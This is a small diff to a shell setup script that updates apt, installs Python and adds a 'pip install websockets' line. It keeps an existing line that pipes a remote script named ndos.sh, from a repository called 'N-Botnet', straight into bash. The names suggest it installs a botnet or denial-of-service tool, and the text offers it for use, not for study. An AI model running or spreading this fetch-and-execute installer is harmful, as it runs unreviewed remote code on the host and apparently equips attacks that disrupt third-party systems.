@@ -2,6 +2,7 @@
 clear
 apt update
 apt install python3
+pip install websockets
 bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/ndos.sh)
 clear
 
